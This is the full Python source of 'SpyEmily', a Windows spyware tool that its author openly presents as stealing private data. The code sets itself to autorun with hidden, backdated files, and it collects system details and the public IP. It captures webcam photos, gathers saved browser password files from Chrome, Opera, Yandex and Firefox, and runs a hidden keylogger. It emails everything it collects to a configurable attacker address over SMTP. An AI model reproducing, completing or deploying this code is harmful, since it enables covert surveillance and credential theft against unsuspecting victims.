############################################
##
## SpyEmily version 1.0
## Author: atlantis
## GitHub: https://github.com/atlanntiss
## SpyEmily is a spyware which steals some
## private data from a computer.
##
############################################

## Standard modules.
import os
import sys
import winreg
import logging
from platform import uname
from getpass import getuser
import urllib.request as urllib

## Email modules.
import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

## Third-party modules.
import cv2
import win32api
import requests
from bs4 import BeautifulSoup
from pynput.keyboard import Key, Listener

## Configuration.

# The fake name of the spyware.
FAKE_APP = ""

# The new path to the application. The program will be copied
# to this directory.
FAKE_APP_DIRECTORY = os.getenv("appdata")

# The path to taken photo from a frontal camera (name of directory).
PATH_TO_IMAGES = os.getenv("appdata")
# The path to data that was collected by the keylogger (name of file).
PATH_TO_KEYLOGGER = os.path.join(os.getenv("appdata"), "keylogger_data.txt")

# SMTP settings.

SMTP_SERVER = ""
SMTP_PORT = 0
SENDER = ""
SENDER_PASSWORD = ""
RECEIVER = ""
# SSL or STARTTLS connection (or NONE) for an email service.
ENCRYPTION = "NONE"

# Browsers' directories with passwords.
BROWSER_DIRECTORIES = (
    os.path.join(os.getenv("appdata"), "Opera Software\\Opera Stable\\Login Data"),
    os.path.join(os.getenv("localappdata"), "Google\\Chrome\\User Data\\Default\\Login Data"),
    os.path.join(os.getenv("localappdata"), "Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data"),
    # Mozilla Firefox randomly generates the name of a folder that 
    # we need, so we use the os.walk function to find that folder.
    os.path.join(list(os.walk(os.path.join(os.getenv("appdata"), "Mozilla\\Firefox\\Profiles\\")))[1][0], "logins.json"),
)

def main():
    """
    The main function of the spyware containing
    all the main instructions which describe
    the algorithm of the SpyEmily.
    """

    # The dictionary that contains all the data that we are
    # going to steal and send.
    data_to_send = dict()

    # The subject of a letter. It will contain information
    # about whether the victim is new or old, and the IP of
    # the victim's computer.
    subject = "SpyEmily"

    try:
        # If the application was started from autorun, we are
        # going to assume that the victim was already infected,
        # so this victim is old.
        if started_from_autorun():
            subject += "[OLD_VICTIM]: "
        # But else, we are going to assume that the victim is new
        # and we do not have any information about the OS of the
        # victim's computer.
        else:
            subject += "[NEW_VICTIM]: "
            set_autorun()
            data_to_send["os_info"] = get_os_info()
        
        # To identify victims, we should get their IP-addresses.
        data_to_send["ip"] = get_ip()
        subject += data_to_send["ip"]

        # We also need to steal some private information.
        data_to_send["photo"] = take_photo()
        data_to_send["passwords"] = steal_passwords()

        # After stealing some data, we check the keylogger data
        # for existence.
        if os.path.isfile(PATH_TO_KEYLOGGER):
            # If it exists, we are going to steal the keylogger
            # data file.
            data_to_send["keylogger_data"] = PATH_TO_KEYLOGGER
        
        # We must have Internet connection to send stolen data.
        # We are waiting for establishing connection below.
        while not internet_connection():
            pass
        
        # After establishing connection, we send collected data
        # and delete all taken photo from the victim's computer.
        send_email(subject, data_to_send)
        delete_files(data_to_send["photo"])

        # After all, we start the keylogger loop.
        start_keylogger()

    except Exception as error_code:
        # If we have an exception, we will receive a message
        # about this with the victim's computer ip address
        # and the error code.
        subject = f"SpyEmily[ERRORS]: {get_ip()}"
        data_to_send["error"] = error_code
        send_email(subject, data_to_send)

def set_autorun():
    """
    Sets the application to autorun. The spyware will automatically
    run at startup.
    """

    # Getting the location of the SpyEmily application.
    app_path = os.path.abspath(sys.argv[0])
    # A new location for the app file.
    new_app_directory = os.path.join(FAKE_APP_DIRECTORY, FAKE_APP)
    new_app_path = os.path.join(new_app_directory, f"{FAKE_APP}.py")
    if not os.path.exists(new_app_directory):
        os.makedirs(new_app_directory)
    # Copying the app file from the initial location to the new one.
    win32api.CopyFile(app_path, new_app_path)

    # Hiding the new path to the app file.
    hide_path(new_app_directory)
    # Setting fake time options (modification and creation time)
    # for the app file and directory.
    os.utime(new_app_directory, (1450000000, 1450000000))
    os.utime(new_app_path, (1450000000, 1450000000))

    # A Windows registry key for autorun.
    startup_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    registry_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        startup_value,
        0,
        winreg.KEY_ALL_ACCESS
        )
    # Setting the autorun option for the spyware. The app file will start
    # with the --quiet key and because of that we can identify whether the
    # app file was started as an autorun option or not.
    winreg.SetValueEx(registry_key, FAKE_APP, 0, winreg.REG_SZ, new_app_path + " --quiet")

def started_from_autorun():
    """
    Checks whether the application was launched automatically.
    """

    try:
        # If the app exists in autorun options, it runs with the key --quiet.
        if sys.argv[1] == "--quiet":
            return True
    except IndexError:
        return False

def get_os_info():
    """
    Gets the information about an operating system of the
    victim's computer.
    """

    os_info = "\nThe information about the victim's computer.\n"
    os_info += f"System: {uname().system}.\n"
    os_info += f"Username: {getuser()}.\n"
    os_info += f"Hostname: {uname().node}.\n"
    os_info += f"Release: {uname().release}.\n"
    os_info += f"Version: {uname().version}.\n"
    os_info += f"Machine: {uname().machine}.\n"
    os_info += f"Processor: {uname().processor}."

    return os_info

def get_ip():
    """
    Gets the IP-address of the victim's computer.
    """

    # Wait for Internet connection to successfully get data from
    # http://ifconfig.co.
    while not internet_connection():
        pass

    try:
        # Getting the text from the <code></code> tag on http://ifconfig.co.
        html = BeautifulSoup(requests.get("http://ifconfig.co").text, "html.parser")
        ip = html.code.text
    except Exception as error:
        # If any errors occurred, we write the error code into the 'ip' 
        # variable.
        ip = error

    return ip

def steal_passwords():
    """
    Finds all the available files containing logins and
    passwords from the popular browsers' directories.
    """

    # The path to files with logins and passwords.
    path = []

    for login_data in BROWSER_DIRECTORIES:
        # If the path to a file exists, it means that a victim have
        # the browser with that path, and there is a file with passwords,
        # so we need to take it.
        if os.path.isfile(login_data):
            path.append(login_data)
    return path

def take_photo():
    """
    Takes 5 photo from a frontal camera of the victim's
    computer.
    """

    # The path to images.
    path = []

    try:
        camera = cv2.VideoCapture(0)
        for screen_id in range(5):
            image = camera.read()[1]
            # Creating the path for an image with something unique like id.
            path.append(os.path.join(PATH_TO_IMAGES, f"screen_{screen_id}.png"))
            # Writing the data of an image to the path.
            cv2.imwrite(path[screen_id], image)
            # Hiding images.
            hide_path(path[screen_id])
        camera.release()
    except:
        pass
    
    return path

def start_keylogger():
    """
    Starts the keylogger that captures every typed key.
    """

    if not os.path.isfile(PATH_TO_KEYLOGGER):
        # Creating and hiding the path to the keylogger data.
        file = open(PATH_TO_KEYLOGGER, 'w+')
        file.close()
        hide_path(PATH_TO_KEYLOGGER)

    # Configuration for logging messages which will be saved
    # in the PATH_TO_KEYLOGGER in certain format.
    logging.basicConfig(
        filename=PATH_TO_KEYLOGGER,
        level=logging.DEBUG,
        format="%(message)s"
        )
    # The function that will write a key to the logging file.
    def on_press(key):
        logging.info(key)
    # The keyboard listener.
    with Listener(on_press=on_press) as listener:
        listener.join()

def send_email(subject, data):
    """
    Sends all collected data from SENDER to RECEIVER via
    the SMTP protocol.
    """

    ## Creating the message body.

    message = MIMEMultipart()
    message["Subject"] = subject
    message["From"] = SENDER
    message["To"] = RECEIVER

    # Checking for any exceptions.
    if "error" not in data:
        text = f"Hello! There is some data from this IP-address: {data['ip']}.\n"
        if "NEW_VICTIM" in subject:
            text += data["os_info"]
        text = MIMEText(text, "plain")

        message.attach(text)

        ## Adding attachments.

        # All files that we have to attach.
        path_to_attach = data["photo"] + data["passwords"]
        if "keylogger_data" in data:
            # Also, if we have a keylogger data file, we attach it too.
            path_to_attach.append(data["keylogger_data"])

        for counter, path in enumerate(path_to_attach):
            # Reading and working with attachments data.
            attachment = MIMEBase("application", "octet-stream")
            with open(path, "rb") as file:
                attachment.set_payload(file.read())
            encoders.encode_base64(attachment)
            attachment.add_header(
                "Content-Disposition", 
                "attachment", 
                # Attachments will be named in this format:
                # file_[number]_[default_name].
                filename=f"file_{counter}_{os.path.basename(path)}"
                )
            message.attach(attachment)
    else:
        # If we have any exceptions, we will receive messages about those ones.
        text = f"Oops! There is some exception! Look at the error code:\n{data['error']}"
        text = MIMEText(text, "plain")
        message.attach(text)
    
    ## Creating a connection to an SMTP-server and sending an email.
    ## If we must use some encryption (SSL or STARTTLS), we perform it.

    try:
        if ENCRYPTION != "NONE":
            if ENCRYPTION == "SSL":
                smtp = smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT)
                smtp.ehlo()
            elif ENCRYPTION == "STARTTLS":
                smtp = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
                smtp.ehlo()
                smtp.starttls()
        else:
            smtp = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        
        smtp.login(SENDER, SENDER_PASSWORD)
        smtp.send_message(message)
        smtp.quit()
    except:
        pass

def hide_path(path):
    """
    Hides a path using Windows file attributes.
    """

    win32api.SetFileAttributes(path, 2)

def internet_connection():
    """
    Checks for Internet connection.
    """
    
    try:
        urllib.urlopen("https://google.com", timeout=5)
        return True
    except urllib.URLError:
        return False

def delete_files(files):
    """
    Deletes some files from the victim's computer.
    """

    for file in files:
        if os.path.isfile(file):
            os.remove(file)

if __name__ == "__main__":
    # If the app file was launched as the main file, the main
    # function will be started.
    main()